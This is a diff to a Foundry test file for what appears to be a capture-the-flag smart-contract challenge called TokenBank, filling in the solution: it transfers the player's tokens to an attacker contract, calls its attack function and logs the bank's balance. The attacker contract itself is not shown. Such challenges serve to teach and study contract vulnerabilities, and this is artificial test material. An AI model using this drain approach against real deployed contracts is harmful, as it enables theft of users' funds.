@@ -16,8 +16,21 @@ contract TankBankTest is Test {
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
         // Put your solution here
+        SimpleERC223Token token = tokenBankChallenge.token();
+    
+        // Transfer player's tokens to the attacker contract
+        vm.startPrank(player);
+        uint256 playerBalance = token.balanceOf(player);
+        console2.log("Initial Challenge Balance: ", token.balanceOf(address(tokenBankChallenge)));
+        // require(playerBalance > 0, "Player should have tokens");
+        token.transfer(address(tokenBankAttacker), playerBalance);
+        vm.stopPrank();
+
+        // Execute the attack
+        tokenBankAttacker.attack();
 
         _checkSolved();
+        console2.log("Initial Challenge Balance: ", token.balanceOf(address(tokenBankChallenge)));
     }
 
     function _checkSolved() internal {
